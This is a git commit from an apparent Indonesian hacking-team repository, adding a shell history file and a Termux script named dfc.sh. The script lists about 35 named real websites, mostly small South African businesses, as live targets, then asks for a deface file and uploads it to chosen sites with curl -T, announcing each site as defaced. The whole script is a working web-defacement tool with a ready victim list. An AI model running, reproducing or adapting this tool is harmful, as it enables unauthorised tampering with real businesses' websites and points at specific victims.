46b11e61d5f1655581f5977f3bafa7ef943d8ece
G7-Hckr <alfitopasha213@gmail.com>
2019-03-27 18:49:44 +0700

    G7Deface

---
+++ .bash_history
@@ -0,0 +1,32 @@
+clear
+exit
+ls
+ls
+clear
+pkg upgrade
+pkg install git
+pkg install figlet
+pkg install ruby
+pkg install php
+clear
+clear
+pkg instal git
+git clone https://github.com/G7-Hckr/G7-Project
+cd G7-Project
+sh al.sh
+gem install lolcat
+clear
+sh al.sh
+exit
+ls
+rm -rf bash.bashrc
+ls
+exit
+clear
+nano bash.rc
+pkg install nano
+nano bash.bashrc
+nano .bashrc
+exit
+git remote add origin https://github.com/G7-Hckr/G7-Deface.git
+exit
---
+++ G7Deface/dfc.sh
@@ -0,0 +1,92 @@
+#usr/bin/bash
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo                                                   pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan                                                 me='\033[31;1m' #merah                                                pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+
+clear
+pkg update && pkg upgrade
+clear
+pkg install git figlet
+clear
+pkg install bash
+clear
+pip2 install requests
+toilet -f slant "G7 Gans" | lolcat
+echo $me"####################["$cy"WELCOME"$me"]####################"
+echo $me"#"$cy"Deface Web"                                     $me"#"
+echo $me"#"$cy"Author  : G7Hckr"                               $me"#"
+echo $me"#"$cy"Team    : ERROR CYBER TEAM"                     $me"#"
+echo $me"#"$cy"Contact : +1 (315) 502-6913"                    $me"#"
+echo $me"###########################################################"
+sleep 3
+echo
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+echo $cy":"$ku"           TARGET  LIVE"$cy"                 :"
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+echo $cy":"$pu" http://contsol.co.za/"$cy"                  :"
+echo $cy":"$pu" http://colourfactory.co.za/"$cy"            :"
+echo $cy":"$pu" http://chillibitez.co.za/"$cy"              :"
+echo $cy":"$pu" http://chasingfantasia.com/"$cy"            :"
+echo $cy":"$pu" http://centraltech.co.za/"$cy"              :"
+echo $cy":"$pu" http://cblandscapes.co.za/"$cy"             :"
+echo $cy":"$pu" http://bee-it.co.za/"$cy"                   :"
+echo $cy":"$pu" http://butterflowers.co.za/"$cy"            :"
+echo $cy":"$pu" http://bananabox.co.za/"$cy"                :"
+echo $cy":"$pu" http://ayk.co.za/"$cy"                      :"
+echo $cy":"$pu" http://ads247.co.za/"$cy"                   :"
+echo $cy":"$pu" http://allpaint.co.za/"$cy"                 :"
+echo $cy":"$pu" http://atlanticphysio.co.za/"$cy"           :"
+echo $cy":"$pu" http://valdicare.co.za/"$cy"                :"
+echo $cy":"$pu" http://vmicl.co.za/"$cy"                    :"
+echo $cy":"$pu" http://troon.co.za/"$cy"                    :"
+echo $cy":"$pu" http://nyarhi.co.za/"$cy"                   :"
+echo $cy":"$pu" http://nitrobikes.co.za/"$cy"               :"
+echo $cy":"$pu" http://nhisa.co.za/"$cy"                    :"
+echo $cy":"$pu" http://netcallcollect.co.za/"$cy"           :"
+echo $cy":"$pu" http://naturaleyeimages.com/"$cy"           :"
+echo $cy":"$pu" http://mpark.co.za/"$cy"                    :"
+echo $cy":"$pu" http://moneyin1week.co.za/"$cy"             :"
+echo $cy":"$pu" http://mix007.co.za/"$cy"                   :"
+echo $cy":"$pu" http://mediacube.co.za/"$cy"                :"
+echo $cy":"$pu" http://megro.co.za/"$cy"                    :"
+echo $cy":"$pu" http://menogold.co.za/"$cy"                 :"
+echo $cy":"$pu" http://mestern.co.za/"$cy"                  :"
+echo $cy":"$pu" http://tcmgroup.co.za/"$cy"                 :"
+echo $cy":"$pu" http://sublimeconfectionery.co.za/"$cy"     :"
+echo $cy":"$pu" http://tieronecapital.co.za/"$cy"           :"
+echo $cy":"$pu" http://thegiftstore.co.za/"$cy"             :"
+echo $cy":"$pu" http://thefoundation.co.za/"$cy"            :"
+echo $cy":"$pu" http://tressor.co.za/"$cy"                  :"
+echo $cy"::::::::::::::::::::::::::::::::::::::::::"
+sleep 2
+echo $pu
+read -p"<===// MASUKAN NAMA SCRIPT DEFACE KAMU : " script
+echo
+echo
+echo $me"TARGET 1!!!"
+read -p"<===// PASTEKAN SALAH SATU WEB DI ATAS : " target
+curl -T /storage/emulated/0/$script $target
+echo
+echo
+echo $cy"["$pu"√"$cy"]"$pu" WEB TELAH TERDEFACE "$cy"["$pu"√"$cy"]"
+echo $bi"[*] SILAHKAN DILIHAT BOSQ"$ku" ===>"$pu $target$script
+echo
+echo
+echo $me"TARGET 2!!!"
+read -p"<===// PASTEKAN SALAH SATU WEB DI ATAS : " target
+curl -T /storage/emulated/0/$script $target
+echo
+echo
+echo $cy"["$pu"√"$cy"]"$pu" WEB TELAH TERDEFACE "$cy"["$pu"√"$cy"]"
+echo $bi"[*] SILAHKAN DILIHAT BOSQ"$ku" ===>"$pu $target$script
+echo
+echo
+echo $me"TARGET 3!!!"
+read -p"<===// PASTEKAN SALAH SATU WEB DI ATAS : " target
+curl -T /storage/emulated/0/$script $target
+echo
+echo
+echo $cy"["$pu"√"$cy"]"$pu" WEB TELAH TERDEFACE "$cy"["$pu"√"$cy"]"
+echo $bi"[*] SILAHKAN DILIHAT BOSQ"$ku" ===>"$pu $target$script
